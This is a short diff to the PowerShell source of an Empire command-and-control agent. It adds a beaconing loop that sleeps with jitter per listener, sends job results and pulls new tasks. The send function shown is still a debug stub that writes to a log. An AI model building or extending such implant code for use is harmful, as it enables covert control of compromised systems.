@@ -807,13 +807,20 @@ function Invoke-Empire {
 		}
 	}
 
-	# send message function iterating through listeners
-	$script:SendMessage = {
-		param($PacketData)
-		[string]::Format("called send message with data = {0}",$PacketData) >> ".\agent_debug.log"
+	$script:BeaconBack = {
+		param($JobResults)
 		foreach ($l in $script:listeners){
 			SleepWithJitter($l)	
+			if ($JobResults) {
+				((& $SendMessage -Listener $l -Packets $JobResults))
+			}
+			((& $script:GetTask))
 		}
+	}
+	# send message function iterating through listeners
+	$script:SendMessage = {
+		param($Listener, $PacketData)
+		[string]::Format("called send message with data = {0}",$PacketData) >> ".\agent_debug.log"
 	}
 
 	$script:GetTask = {
